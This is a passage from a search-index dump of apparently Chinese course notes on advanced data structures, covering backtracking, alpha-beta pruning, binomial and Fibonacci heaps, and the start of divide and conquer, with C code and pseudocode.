\u4e2d\uff0c\u4e14\u65e0\u91cd\u590d\n    OK = Check( D_max, N, left, right ); /* pruning */\n    if ( OK ) { /* add X[right] and update D */\n        X[right] = D_max;\n        for ( i=1; i&lt;left; i++ )  Delete( |X[right]-X[i]|, D);\n        for ( i=right+1; i&lt;=N; i++ )  Delete( |X[right]-X[i]|, D);\n        Found = Reconstruct ( X, D, N, left, right-1 );\n        if ( !Found ) { /* if does not work, undo */\n            for ( i=1; i&lt;left; i++ )  Insert( |X[right]-X[i]|, D);\n            for ( i=right+1; i&lt;=N; i++ )  Insert( |X[right]-X[i]|, D);\n        }\n    }\n    /* finish checking option 1 */\n\n    if ( !Found ) { /* if option 1 does not work */\n        /* option 2: X[left] = X[N]-D_max */\n        OK = Check( X[N]-D_max, N, left, right );\n        if ( OK ) {\n            X[left] = X[N] \u2013 D_max;\n            for ( i=1; i&lt;left; i++ )  Delete( |X[left]-X[i]|, D);\n            for ( i=right+1; i&lt;=N; i++ )  Delete( |X[left]-X[i]|, D);\n            Found = Reconstruct (X, D, N, left+1, right );\n            if ( !Found ) {\n                for ( i=1; i&lt;left; i++ ) Insert( |X[left]-X[i]|, D);\n                for ( i=right+1; i&lt;=N; i++ ) Insert( |X[left]-X[i]|, D);\n            }\n        }\n        /* finish checking option 2 */\n    }\n    /* finish checking all the options */\n\n    return Found;\n}\n</code></pre> <p>\u56e0\u6b64\uff0cBacktracing\u7684\u601d\u60f3\u53ef\u4ee5\u7b80\u5316\u6210\u5982\u4e0b\u6a21\u677f\uff1a</p> <pre><code>bool Backtracking ( int i )\n{   Found = false;\n    if ( i &gt; N )\n        return true; /* solved with (x1, \u2026, xN) */\n    for ( each xi in Si ) { \n        /* check if satisfies the restriction R */\n        OK = Check((x1, \u2026, xi) , R ); /* pruning */\n        if ( OK ) {\n            Count xi in;\n            Found = Backtracking( i+1 );\n            if ( !Found )\n                Undo( i ); /* recover to (x1, \u2026, xi-1) */\n        }\n        if ( Found ) break; \n    }\n    return Found;\n}\n</code></pre>"},{"location":"Courses/DS/ADS/Backtracking/#alpha-beta","title":"Alpha-Beta \u526a\u679d","text":"<p>\u03b1-\u03b2 \u526a\u679d\u662f\u4e00\u79cd\u5bf9\u6297\u6027\u641c\u7d22\u7b97\u6cd5\uff0c\u7528\u4ee5\u51cf\u5c0f\u6781\u5c0f\u5316\u6781\u5927\u7b97\u6cd5\uff08Minimax\u7b97\u6cd5\uff09\u641c\u7d22\u6811\u7684\u8282\u70b9\u6570\uff0c\u4e3b\u8981\u5e94\u7528\u4e8e\u673a\u5668\u6e38\u73a9\u7684\u4e8c\u4eba\u6e38\u620f\uff0c\u5982\u4e95\u5b57\u68cb\u3001\u8c61\u68cb\u3001\u56f4\u68cb\u7b49\u3002</p> <p>Minimax</p> <p>\u662f\u4e00\u79cd\u627e\u51fa\u5931\u8d25\u7684\u6700\u5927\u53ef\u80fd\u6027\u4e2d\u7684\u6700\u5c0f\u503c\u7684\u7b97\u6cd5\uff08\u6700\u5c0f\u5316\u6700\u574f\u60c5\u51b5\uff09</p> <p>\u4ee5\u4e0b\u68cb\u4e3a\u4f8b\u5b50\uff0c\u5148\u624b\u5e0c\u671b\u4e0b\u4e00\u6b65\u7684\u5c40\u9762\u662f\u81ea\u5df1\u80dc\u7b97\u6700\u5927\u7684\u5c40\u9762\uff0c\u800c\u540e\u624b\u5e0c\u671b\u4e0b\u4e00\u6b65\u7684\u5c40\u9762\u662f\u5148\u624b\u80dc\u7b97\u6700\u5c0f\u7684\u5c40\u9762\u3002\u800c\u4f7f\u7528\u4e0a\u8ff0\u4e24\u79cd\u7b97\u6cd5\u53ef\u4ee5\u5bf9\u5f53\u524d\u5c40\u9762\u8fdb\u884c\u4f30\u4ef7\u3002</p> <p>Tic-tac-toc</p> <p>\u4ee5\u4eba\u673a\u4e95\u5b57\u68cb\u4e3a\u4f8b\uff0c\u4f30\u4ef7\u51fd\u6570 \\(f(P)=W_{Computer} - W_{Human}\\)\uff0c\u5176\u4e2d \\(W\\) \u4ee3\u8868\u5f53\u524d\u573a\u9762\u9009\u624b\u80fd\u591f\u83b7\u80dc\u53ef\u80fd\u7684\u5e03\u5c40\u3002</p> <p></p> <p>\u90a3\u4e48\u6211\u4eec\u7528\u6b63\u65b9\u5f62\u4ee3\u8868\u5148\u624b\uff0c\u9009\u62e9\u4f30\u4ef7\u6700\u5927\u7684\u5c40\u9762\uff1b\u5706\u5f62\u4ee3\u8868\u540e\u624b\uff0c\u9009\u62e9\u4f30\u4ef7\u6700\u5c0f\u7684\u5c40\u9762\u3002\u5047\u8bbe\u73b0\u5728\u77e5\u9053\u56db\u6b65\u540e\u6240\u6709\u53ef\u80fd\u573a\u9762\u7684\u4f30\u4ef7\uff0c\u5176\u535a\u5f08\u6811\u5982\u4e0b\uff1a</p> <p></p> <p>\u5728\u5148\u624b\u548c\u540e\u624b\u90fd\u9009\u62e9\u5bf9\u81ea\u5df1\u6700\u6709\u5229\u7684\u6761\u4ef6\u4e0b\uff0c\u6211\u4eec\u53ef\u4ee5\u4ece\u5b50\u8282\u70b9\u4e00\u6b65\u4e00\u6b65\u9006\u63a8\u56de\u53bb\u4e24\u4e2a\u68cb\u624b\u5728\u6bcf\u4e00\u6b65\u4f1a\u5982\u4f55\u51b3\u7b56\uff0c\u539f\u5219\u662f\u5148\u624b\u9009\u62e9\u4e24\u4e2a\u5b50\u8282\u70b9\u4e2d\u6700\u5927\u7684\uff0c\u540e\u624b\u9009\u62e9\u4e24\u4e2a\u5b50\u7ed3\u70b9\u4e2d\u6700\u5c0f\u7684\uff1a</p> Step 1Step 2Step 3Step 4 <p></p> <p></p> <p></p> <p></p> <p>\u56e0\u6b64\uff0c\u68cb\u5c40\u6700\u7ec8\u7684\u8d70\u5411\u5982\u56fe\uff1a</p> <p></p> <p>\u6309\u7167\u4e0a\u8ff0\u7b97\u6cd5\u601d\u60f3\u5904\u7406\u51b3\u7b56\u6811\uff0c\u9700\u8981\u7684\u8ba1\u7b97\u91cf\u968f\u7740\u6b65\u6570\u5448\u6307\u6570\u7ea7\u589e\u957f\uff0c\u53ef\u4ee5\u5bf9\u5176\u8fdb\u884c\u526a\u679d\u51cf\u5c11\u4e0d\u5fc5\u8981\u7684\u72b6\u6001\u3002</p> <p>\u5728 Alpha-Beta \u526a\u679d\u4e2d\uff0c\u4f7f\u7528 \u03b1 \u8868\u793a\u76ee\u524d\u6240\u6709\u53ef\u80fd\u89e3\u7684\u6700\u5927\u4e0b\u754c\uff0c\u03b2 \u8868\u793a\u76ee\u524d\u6240\u6709\u53ef\u80fd\u89e3\u7684\u6700\u5c0f\u4e0a\u754c\u3002\u56e0\u6b64\uff0c\u5728\u6811\u7684\u6700\u4f18\u89e3\u8def\u5f84\u4e0a\uff0c\u8282\u70b9\u7684\u4f30\u4ef7\u503c\u4e00\u5b9a\u6ee1\u8db3\uff1a</p> \\[ \\alpha \\le N \\le \\beta \\] <p>\u5728\u7b97\u6cd5\u8fd0\u884c\u8fc7\u7a0b\u4e2d\uff0c\u6700\u5927\u4e0b\u754c\u548c\u6700\u5c0f\u4e0a\u754c\u9010\u6e10\u903c\u8fd1\uff0c\u5982\u679c\u5bf9\u4e8e\u67d0\u4e00\u8282\u70b9\u51fa\u73b0 \\(\\alpha \\gt \\beta\\) \uff0c\u5c31\u53ef\u4ee5\u5c06\u5176\u526a\u679d\u53bb\u6389\u4e86\u3002</p> <p>\u540c\u6837\u5bf9\u4e0a\u9762\u7684\u535a\u5f08\u6811\u8fdb\u884c\u64cd\u4f5c\uff0c\u6211\u4eec\u5bf9\u6839\u8282\u70b9\u4f7f\u7528\u6df1\u5ea6\u4f18\u5148\u641c\u7d22\uff0c\u5e76\u4e14\u5c06\u7236\u8282\u70b9\u7684 \u03b1,\u03b2 \u503c\u7ee7\u627f\u7ed9\u5b50\u8282\u70b9\uff0c\u90a3\u4e48\u7b2c\u4e00\u6b21\u5230\u8fbe\u53f6\u8282\u70b9\u7684\u641c\u7d22\u8def\u5f84\u5982\u4e0b\uff1a</p> <p></p> <p>\u8be5\u53f6\u8282\u70b9\u7684\u6743\u503c\u4e3a 3\uff0c\u800c\u5b83\u7684\u7236\u8282\u70b9\u662f Min \u8282\u70b9\uff0c\u7531\u4e8e \\(\\beta \\gt 3\\) \uff0c\u6240\u4ee5\u66f4\u65b0\u6700\u5c0f\u4e0a\u754c\u4e3a 3\u3002\u641c\u7d22\u5b8c\u5de6\u8282\u70b9\uff0c\u4e0b\u4e00\u6b65\u641c\u7d22\u5230\u6743\u503c\u4e3a 17 \u7684\u53f3\u8282\u70b9\uff0c\u4f46\u6b64\u65f6 \\(\\beta =3\\lt 17\\) \uff0c\u6240\u4ee5\u4e0d\u5bf9\u7236\u8282\u70b9\u8fdb\u884c\u66f4\u65b0\u3002</p> <p>\u641c\u7d22\u5b8c\u8be5 Min \u8282\u70b9\u7684\u6240\u6709\u5b50\u8282\u70b9\uff0c\u8fd4\u56de\u4e0a\u4e00\u5c42 Max \u8282\u70b9\u5e76\u5bf9\u5176 \u03b1 \u503c\u8fdb\u884c\u66f4\u65b0\uff0c\u5373\u66f4\u65b0\u4e3a\u5b50\u7ed3\u70b9\u4e2d\u6700\u5927\u7684\u5df2\u786e\u5b9a\u6743\u503c\u3002\u6b64\u65f6\u7531\u4e8e Max \u8282\u70b9\u7684\u53f3\u5b50\u8282\u70b9\u7684 \u03b2 \u503c\u4ecd\u662f \\(\\infty\\) \uff0c\u6240\u4ee5 \\(\\alpha =3\\) \uff0c\u5e76\u4e14\u53f3\u5b50\u8282\u70b9\u7ee7\u627f\u7236\u8282\u70b9\u7684 \u03b1,\u03b2 \u503c\uff1a</p> <p></p> <p>\u5bf9\u8be5 Min \u8282\u70b9\u7ee7\u7eed\u5411\u4e0b\u641c\u7d22\uff0c\u5176\u5de6\u5b50\u8282\u70b9\u7684\u6743\u503c\u4e3a 2\uff0c\u56e0\u6b64\u66f4\u65b0 \\(\\beta =2\\) \uff0c\u6b64\u65f6 \\(\\alpha \\gt \\beta\\) \uff0c\u5219\u5c06\u5176\u526a\u679d\uff08\u03b1 cut off\uff09\uff0c\u4e0d\u518d\u68c0\u67e5\u53f3\u5b50\u8282\u70b9\u3002</p> <p>\u7ee7\u7eed\u56de\u6eaf\u5230\u4e0a\u4e00\u5c42 Min \u8282\u70b9\uff0c\u66f4\u65b0\u5176 \u03b2 \u503c\u4e3a\u5b50\u8282\u70b9\u4e2d\u6700\u5c0f\u7684\u5df2\u786e\u5b9a\u6743\u503c\uff0c\u5373 \\(\\beta =3\\)\u3002\u7ee7\u7eed\u5411\u4e0b\u641c\u7d22\u81f3\u53f6\u8282\u70b9\uff1a</p> <p></p> <p>\u7531\u4e8e \\(\\beta \\lt 15\\) \u6240\u4ee5\u4e0d\u5bf9\u5176\u8fdb\u884c\u66f4\u65b0\uff0c\u4ec5\u5c06\u8be5 Min \u8282\u70b9\u6743\u503c\u8bbe\u4e3a 15 \uff0c\u7ee7\u7eed\u8fd4\u56de\u5230\u4e0a\u4e00\u5c42 Max \u8282\u70b9\u3002\u6b64\u65f6\u7531\u4e8e \\(\\alpha \\lt 15\\) \uff0c\u66f4\u65b0 \\(\\alpha = 15\\)\uff0c\u53c8 \\(\\beta \\lt 15\\) \uff0c\u5219\u5bf9\u5176\u8fdb\u884c\u526a\u679d\uff08\u03b2 cut off\uff09\uff0c\u4e0d\u518d\u641c\u7d22\u5176\u53f3\u5b50\u6811\uff1a</p> <p></p> <p>\u5269\u4f59\u5b50\u6811\u7684\u641c\u7d22\u57fa\u672c\u540c\u4e0a\u76f8\u540c\uff0c\u6700\u7ec8\u7684\u641c\u7d22\u8def\u5f84\u4e3a\uff1a</p> <p></p> <p>\u76f8\u6bd4\u4e8e Minimax \u7b97\u6cd5\uff0c\u6709\u8f83\u5927\u63d0\u5347\u3002</p> <p>\u5728\u7ef4\u57fa\u767e\u79d1\u4e2d\u7ed9\u51fa\u7684\u4f2a\u4ee3\u7801\u5982\u4e0b\uff1a</p> <pre><code>function alphabeta(node, depth, \u03b1, \u03b2, maximizingPlayer) is\n    if depth == 0 or node is terminal then\n        return the heuristic value of node\n    if maximizingPlayer then\n        value := \u2212\u221e\n        for each child of node do\n            value := max(value, alphabeta(child, depth \u2212 1, \u03b1, \u03b2, FALSE))\n            if value &gt; \u03b2 then\n                break (* \u03b2 cutoff *)\n            \u03b1 := max(\u03b1, value)\n        return value\n    else\n        value := +\u221e\n        for each child of node do\n            value := min(value, alphabeta(child, depth \u2212 1, \u03b1, \u03b2, TRUE))\n            if value &lt; \u03b1 then\n                break (* \u03b1 cutoff *)\n            \u03b2 := min(\u03b2, value)\n        return value\n\n(* Initial call *)\nalphabeta(origin, depth, \u2212\u221e, +\u221e, TRUE)\n</code></pre> Worst-case performance Best-case Performance \\(O(b ^d)\\) \\(O(\\sqrt{b ^d})\\) <p>\\(\\alpha -\\beta\\) \u526a\u679d\u53ef\u4ee5\u5c06\u8981\u67e5\u627e\u8282\u70b9\u6570\u51cf\u5c11\u81f3 \\(O(\\sqrt{N})\\)</p> <p>Example\uff1a</p> <p>\u54ea\u4e2a\u8282\u70b9\u6700\u5148\u88ab\u526a\u679d\uff1f</p> <p></p> Answer <p>\u8282\u70b9c\u3002\u5f53\u641c\u7d22\u5230\u8282\u70b9b\u65f6\uff0c\u56de\u6eaf\u5230 Min \u7956\u8282\u70b9 68 \uff0c\u53d1\u751f \u03b2 \u526a\u679d\uff0c\u4e0d\u9700\u8981\u518d\u5bf9\u8282\u70b9 c \u8fdb\u884c\u641c\u7d22\u3002</p>"},{"location":"Courses/DS/ADS/Binomial%20Queue/","title":"Binomial Queue","text":"<p> \u7ea6 945 \u4e2a\u5b57  72 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 6 \u5206\u949f</p>"},{"location":"Courses/DS/ADS/Binomial%20Queue/#structure","title":"Structure","text":"<p>Leftist Heap \u548c Skew Heap \u5e76\u4e0d\u652f\u6301 Decrease-Key \u64cd\u4f5c\uff08\u51cf\u5c11\u67d0\u4e2akey\u503c\uff0c\u5e76\u8fdb\u884c\u8c03\u6574\uff09\uff0c\u4f46\u672c\u8282\u8ba8\u8bba\u7684 Binomial Queue(\u4e8c\u9879\u961f\u5217) \u7684 Decrease-Key \u64cd\u4f5c\u4ec5\u9700 \\(O(\\log N)\\) </p> <p>Decrease-Key\u662f\u8bb8\u591a\u4f7f\u7528\u4f18\u5148\u7ea7\u961f\u5217\u7684\u7b97\u6cd5\u7684\u91cd\u8981\u7ec4\u6210\u90e8\u5206</p> <p>\u5b9a\u4e49 Binomial Tree \u4e3a\u6ee1\u8db3 Heap-ordered \u7684\u5927\u5c0f\u987a\u5e8f\uff0c\u4e14\u7ed3\u6784\u7c7b\u4f3c\u4e8e\u4e8c\u8fdb\u5236\u6027\u8d28\u7684\u6811\uff0c\u5176\u5408\u5e76\u65b9\u5f0f\u4e3a\u4ee4\u5176\u4e2d\u4e00\u9897\u6811\u76f4\u63a5\u6210\u4e3a\u53e6\u4e00\u9897\u6811\u7684\u5b50\u6811\u3002</p> <p></p> <p>\u4e8c\u9879\u6811\u7684\u6bcf\u4e2achild\u672c\u8eab\u4e5f\u662f\u4e8c\u9879\u6811(eg: 1000-1=111)</p> <p>\u800c\u4e8c\u9879\u961f\u5217\u5c31\u662f\u4e00\u7cfb\u5217\u4e8c\u9879\u6811\u7684\u96c6\u5408\uff0c\u6bcf\u4e2a\u4e8c\u9879\u6811\u7684\u9636\u6570 k \u90fd\u4e0d\u76f8\u540c</p> <p>\u7531\u4e8e\u4e8c\u9879\u6811\u7b26\u5408\u5806\u7684\u6027\u8d28\uff0c\u4f46\u53c8\u4e0d\u80fd\u7528\u6570\u7ec4\u6765\u8868\u793a\uff0c\u6211\u4eec\u91c7\u7528 Left-Child-Next-Sibling Tree with Linked List \u7684\u7ed3\u6784\u6765\u8868\u793a\u8be5\u6570\uff1a</p> <pre><code>typedef struct BinNode* BinTree;\ntypedef struct Collection* BinQueue;\n\nstruct BinNode{\n    ElementType Element;\n    BinTree LeftChild;\n    BinTree NextSibling;\n}\n\nstruct Collection{\n    int CurrentSize;\n    BinTree TheTrees[MaxTrees];\n}\n</code></pre>"},{"location":"Courses/DS/ADS/Binomial%20Queue/#operation","title":"Operation","text":""},{"location":"Courses/DS/ADS/Binomial%20Queue/#find-min","title":"Find-Min","text":"<p>\u6700\u5c0f\u503c\u5b58\u50a8\u4e8e\u961f\u5217\u5176\u4e2d\u4e00\u4e2a\u4e8c\u9879\u6811\u7684\u6839\u8282\u70b9\u4e0a\uff0c\u56e0\u6b64\u53ea\u9700\u8981\u904d\u5386\u4e00\u904d\u6839\u8282\u70b9\u5373\u53ef\uff0c\u65f6\u95f4\u590d\u6742\u5ea6\u4e3a \\(O(\\log N)\\) </p> <p>\u6709\u4e9b\u7ed3\u6784\u4f1a\u4f7f\u7528\u989d\u5916\u4e00\u4e2a\u6307\u9488\u7ef4\u62a4\u6700\u5c0f\u503c\uff0c\u65f6\u95f4\u590d\u6742\u5ea6\u53ef\u4ee5\u4e3a \\(O(1)\\)</p>"},{"location":"Courses/DS/ADS/Binomial%20Queue/#merge","title":"Merge","text":"<p>\u7c7b\u4f3c\u4e8c\u8fdb\u5236\u7684\u52a0\u6cd5\uff0c\u4e14\u65f6\u95f4\u590d\u6742\u5ea6\u4e3a \\(O(\\log N)\\)</p> <p></p> <p>\u90a3\u4e48\uff0cInsert \u4e5f\u53ef\u4ee5\u770b\u4f5c\u662f Merge \u4e00\u4e2a B<sub>0</sub> \u548c\u4e00\u4e2a\u4e8c\u9879\u961f\u5217\uff0c\u53ef\u590d\u7528\u5408\u5e76\u8fc7\u7a0b\u3002</p> <pre><code>BinQueue Merge(BinQueue H1, BinQueue H2) {\n    BinTree T1, T2, Carry = NULL;\n    int i,j;\n    if(H1-&gt;CurrentSize + H2-&gt;CurrentSize &gt; Capacity)\n        ErrorMessage();\n    H1-&gt;CurrentSize += H2-&gt;CurrentSize;\n    for(i=0,j=1;j&lt;=H1-&gt;CurrentSize;i++,j*=2){\n        T1 = H1-&gt;TheTrees[i];\n        T2 = H2-&gt;TheTrees[i];\n        switch(4*!!Carry+2*!!T2+!!T1){\n            case 0://000\n            case 1://001\n                break;\n            case 2://010\n                H1-&gt;TheTrees[i] = T2;\n                H2-&gt;TheTrees[i] = NULL;\n                break;\n            case 3://011\n                Carry = Combine(T1, T2);\n                H1-&gt;TheTrees[i] = NULL;\n                H2-&gt;TheTrees[i] = NULL;\n                break;\n            case 4://100\n                H1-&gt;TheTrees[i] = Carry;\n                Carry = NULL;\n                break;\n            case 5://101\n                Carry = Combine(Carry, T1);\n                break;\n            case 6://110\n                Carry = Combine(Carry, T2);\n                break;\n            case 7://111\n                H1-&gt;TheTrees[i] = Carry;\n                Carry = Combine(T1, T2);\n                H2-&gt;TheTrees[i] = NULL;\n                break;\n        }//End-Switch\n    }return H1;\n}\n\nBinTree Combine(BinTree T1, BinTree T2) {\n    if(T1-&gt;Element &gt; T2-&gt;Element)\n        return Combine(T2, T1);\n    T2-&gt;NextSibling = T1-&gt;LeftChild;\n    T1-&gt;LeftChild = T2;\n    return T1;\n}\n</code></pre>"},{"location":"Courses/DS/ADS/Binomial%20Queue/#delete-min","title":"Delete-Min","text":"<p>\u5220\u9664\u6700\u5c0f\u8282\u70b9\u64cd\u4f5c\u5206\u56db\u6b65\uff1a</p> <ul> <li>Step 1: FindMin in \\(B_k\\)<ul> <li>\\(O(\\log N)\\)</li> </ul> </li> <li>Step 2: Remove \\(B_k\\) from \\(H\\)<ul> <li>\\(O(1)\\)</li> </ul> </li> <li>Step 3: Remove Root from \\(B_k\\)<ul> <li>\\(O(\\log N)\\)</li> </ul> </li> <li>Step 4: Merge(\\(H'\\),\\(H''\\))<ul> <li>\\(O(\\log N)\\)</li> </ul> </li> </ul> <p>\u5176\u4e2d \\(H'\\) \u4e3a \\(H\\) \u5220\u53bb \\(B_k\\) \u540e\u7684\u4e8c\u9879\u961f\u5217\uff1b\\(H''\\) \u4e3a \\(B_k\\) \u5220\u53bb\u6839\u8282\u70b9\u540e\u5f62\u6210\u7684\u4e8c\u9879\u961f\u5217\u3002</p>"},{"location":"Courses/DS/ADS/Binomial%20Queue/#_1","title":"\u5747\u644a\u5206\u6790","text":"<p>\u7ed3\u8bba\uff1a\u5bf9\u4e8e\u4e8c\u9879\u961f\u5217\u5355\u6b65\u63d2\u5165\u5efa\u7acb\u6570\u636e\u7ed3\u6784\uff0c\u6240\u9700\u7684\u65f6\u95f4\u590d\u6742\u5ea6\u4e3a \\(O(N)\\)</p> <p>\u5148\u4f7f\u7528\u7d2f\u52a0\u6cd5\uff08Aggerate\uff09\u8fdb\u884c\u5206\u6790\uff0c\u56fe\u4e2d <code>step</code> \u4ee3\u8868\u5efa\u6811\u7684\u6d88\u8017\uff0c<code>link</code> \u4ee3\u8868\u5408\u5e76\u6811\u7684\u6d88\u8017\uff1a</p> <p></p> <p>\u53ef\u4ee5\u770b\u5230\uff0c\u6bcf\u4e00\u6b65\u63d2\u5165\u7684\u6d88\u8017\u7b26\u5408\uff1a</p> <pre><code>if(H=...0) credit = 1;\nif(H=...01) credit = 2;\nif(H=...011) credit = 3;\n...\n</code></pre> <p>\u90a3\u4e48\u603b\u6d88\u8017\u4e3a\uff1a</p> \\[ \\sum Credit = 1* \\frac{N}{2}+ 2* \\frac{N}{4} + 3* \\frac{N}{8} ... = O(N) \\] <p>\u548c PPT \u4e0a\u7565\u6709\u4e0d\u540c\uff0c\u4f46\u6700\u7ec8\u7ed3\u679c\u662f\u4e00\u6837\u7684\u3002</p> <p>\u63a5\u4e0b\u6765\u4f7f\u7528\u52bf\u80fd\u5206\u6790\u6cd5\u5206\u6790\uff0c\u8bbe\u5b9a\u52bf\u80fd\u51fd\u6570\u4e3a\uff1a</p> \\[ \\phi _i =\\text{Number of trees after ith insertion} \\] <p>\u5176\u4e2d\uff0c\u6bcf\u6b65\u7684\u52bf\u80fd\u53d8\u5316\u5df2\u7ecf\u6807\u6ce8\u5728\u4e0a\u56fe\u5de6\u4fa7\u7ea2\u8272\u65b9\u6846\u5185\uff0c\u53ef\u4ee5\u770b\u51fa\u6bcf\u6b65\u7684\u5747\u644a\u6d88\u8017\uff1a</p> \\[ C_i +\\phi_i -\\phi_{i-1} = 2 \\] <p>\u90a3\u4e48</p> \\[ \\sum C_i +\\phi_i - \\phi_{i-1} = 2N - \\phi_N \\le 2N = O(N) \\]"},{"location":"Courses/DS/ADS/Binomial%20Queue/#project2-fibonacci-queue","title":"Project2: Fibonacci Queue","text":"<p>YouTube:\u00a0https://www.youtube.com/watch?v=6JxvKfSV9Ns</p> <p>Insert\uff1a \u5c06\u5f85\u63d2\u5165\u8282\u70b9\u4f5c\u4e3a\u4e00\u9897\u65b0\u6811\u63d2\u5165\uff0c\u5e76\u5224\u65ad\u4e00\u6b21\u6700\u5c0f\u503c\u7684\u66f4\u65b0\uff0c\u4e14\u4e0d\u8fdb\u884c\u6811\u7684\u5408\u5e76</p> <p>Delete-Min\uff1a \u5220\u9664\u6700\u5c0f\u503c\u5bf9\u5e94\u7684\u8282\u70b9\uff0c\u5176\u5b50\u6811\u91cd\u65b0\u63d2\u5165\u56de\u6590\u6ce2\u90a3\u5951\u5806\u4e2d\uff1b\u5bf9\u62e5\u6709\u76f8\u540c\u5ea6\u7684\u6811\u8fdb\u884c\u5408\u5e76\uff0c\u4fdd\u8bc1\u6bcf\u4e2a\u5ea6\u7684\u6811\u6700\u540e\u90fd\u53ea\u5269\u4e00\u4e2a\uff0c\u5747\u644a\u5206\u6790\u53ef\u5f97\u65f6\u95f4\u590d\u6742\u5ea6\u4e3a \\(O(\\log N)\\)</p> <p>Decrease-Key\uff1a \u5c06\u952e\u503c\u6539\u53d8\u7684\u8282\u70b9\u8fde\u5e26\u5b50\u6811\u4f5c\u4e3a\u4e00\u9897\u65b0\u6811\u63d2\u5165\u6590\u6ce2\u90a3\u5951\u5806\uff0c\u4f46\u662f\u8981\u6c42\u6bcf\u4e2a\u8282\u70b9\u6700\u591a\u53ea\u80fd\u5931\u53bb\u4e00\u4e2a\u5b50\u8282\u70b9\uff0c\u5426\u5219\u5c06\u5176\u4e5f\u5220\u53bb\u4f5c\u4e3a\u65b0\u6811\u63d2\u5165\u6590\u6ce2\u90a3\u5951\u5806\uff1a</p> <pre><code>del cut_out(node):\n    move node into root list\n    node.marked = False\n    if not node.parent.marked:\n        parent.marked = True\n    else\n        cut_out(node.parent)\n</code></pre> <p>\u65f6\u95f4\u590d\u6742\u5ea6\u4e3a \\(O(1)\\)</p> <p>\u6590\u6ce2\u90a3\u5951\u5806\u4e2d\u5404\u4e2a\u6811\u7684\u6700\u5c11\u8282\u70b9\u6570\u5448\u6590\u6ce2\u90a3\u5951\u6570\u5217\u6392\u5217\uff08\u5047\u8bbe\u6bcf\u4e2a\u5ea6\u7684\u6811\u90fd\u5b58\u5728\u4e14\u552f\u4e00\uff09</p>"},{"location":"Courses/DS/ADS/Binomial%20Queue/#summary-heap","title":"Summary: Heap","text":"Heap Make Heap Find-Min Delete-Min Merge Insert Decrease-Key Leftist Heap \\(O(N)\\) \\(O(1)\\) \\(O(\\log N)\\) \\(O(\\log N)\\) \\(O(\\log N)\\) Not Support Skew Heap \\(O(N)\\) \\(O(1)\\) \\(O(\\log N)\\)(amortized) \\(O(\\log N)\\)(amortized) \\(O(\\log N)\\) Not Support Binomial Heap \\(O(N)\\) \\(O(1)\\) \\(O(\\log N)\\) \\(O(\\log N)\\) \\(O(1)\\)(amortized) \\(O(\\log N)\\) Fibonacci Heap \\(O(N)\\) \\(O(1)\\) \\(O(\\log N)\\)(amortized) \\(O(1)\\)(amortized) \\(O(1)\\)(amortized) \\(O(1)\\)(amortized) Binary Heap \\(O(N)\\) \\(O(1)\\) \\(O(\\log N)\\) \\(O(N)\\) \\(O(\\log N)\\) \\(O(\\log N)\\) <p>Skew Heap \u7684\u5efa\u5806\u64cd\u4f5c\u5728\u5747\u644a\u5206\u6790\u4e0b\u662f \\(O(N\\log N)\\) \uff0c\u53ef\u80fd\u9700\u8981\u6ce8\u610f</p>"},{"location":"Courses/DS/ADS/Divide%20%26%20Conquer/","title":"Divide & Conquer","text":""},{"location":"Courses/DS/ADS/Divide%20%26%20Conquer/#divide-conquer","title":"Divide &amp; Conquer","text":"<p> \u7ea6 1555 \u4e2a\u5b57  31 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 8 \u5206\u949f</p>"},{"location":"Courses/DS/ADS/Divide%20%26%20Conquer/#overview","title":"Overview","text":"<p>To solve a problem recursively,we can:</p> <ul> <li>Divide the problem into a number of sub-problems</li> <li>Conquer the sub-problems by solving them recursively</li> <li>Combine the solutions to the sub-problems into the solution for the original problem</li> </ul> <p>\u5f97\u5230\u7684\u9012\u5f52\u65f6\u95f4\u590d\u6742\u5ea6\u7b49\u5f0f\u7684\u4e00\u822c\u5f62\u5f0f\u5982\u4e0b\uff1a</p> \\[ T(N) = aT(N / b) +f(N)   \\] <p>\u91c7\u7528\u5206\u6cbb\u601d\u60f3\u7684\u7b97\u6cd5\u65f6\u95f4\u590d\u6742\u5ea6</p> <ul> <li>The maximum subsequence sum \u6700\u5927\u5b50\u4e32\u548c - the \\(O(N\\log N)\\) solution</li> <li>Tree traversals \u6811\u904d\u5386 - \\(O(N)\\)</li> <li>Mergesort &amp; quicksort - \\(O(N\\log N)\\)</li> </ul>"},{"location":"Courses/DS/ADS/Divide%20%26%20Conquer/#closest-points-problem","title":"\u7ecf\u5178\u6848\u4f8b\uff1aClosest Points Problem","text":"<p>\u5728\u4e00\u4e2a\u4e8c\u7ef4\u5e73\u9762\u4e0a\u7ed9\u51fa \\(N\\) \u4e2a\u70b9\uff0c\u627e\u51fa\u4e00\u5bf9\u8ddd\u79bb\u6700\u77ed\u7684\u70b9\u3002</p> <p>\u5982\u679c\u6211\u4eec\u4f7f\u7528\u7a77\u4e3e\u641c\u7d22\uff0c\u4e00\u5171\u9700\u8981\u68c0\u67e5 \\(N(N-1) / 2\\) \u7ec4\u70b9\u5bf9\uff0c\u5373\u65f6\u95f4\u590d\u6742\u5ea6\u8fbe\u5230 \\(O(N^2)\\)\u3002</p> <p>\u56e0\u6b64\uff0c\u6211\u4eec\u8003\u8651\u4f7f\u7528\u548c\u6700\u5927\u5b50\u5e8f\u5217\u95ee\u9898\u7c7b\u4f3c\u7684\u5206\u6cbb\u6cd5\u6765\u89e3\u51b3\u8be5\u95ee\u9898\u3002</p> <p>\u9009\u53d6\u4e00\u4e2a\u5e73\u884c\u4e8e y \u8f74\u7684\u76f4\u7ebf\uff0c\u5c06\u5e73\u9762\u5206\u6210\u4e24\u4e2a\u90e8\u5206\uff0c\u5206\u522b\u770b\u4f5c\u4e00\u4e2a\u5b50\u95ee\u9898\u6c42\u5185\u90e8\u70b9\u4e4b\u95f4\u6700\u77ed\u8def\u5f84\u3002\u5728\u5df2\u77e5\u4e24\u90e8\u5206\u5e73\u9762\u5185\u90e8\u70b9\u5404\u81ea\u6700\u77ed\u8def\u5f84\u7684\u60c5\u51b5\u4e0b\uff0c\u8fd8\u9700\u8981\u6c42\u4e24\u90e8\u5206\u4e4b\u95f4\u7684\u70b9\u4e92\u76f8\u7684\u6700\u77ed\u8ddd\u79bb\uff0c\u8fd9\u90e8\u5206\u7b97\u6cd5\u7684\u65f6\u95f4\u590d\u6742\u5ea6\u5c06\u51b3\u5b9a\u6574\u4e2a\u9012\u5f52\u7b97\u6cd5\u7684\u65f6\u95f4\u590d\u6742\u5ea6\uff1a</p> <p>\u82e5 Combine 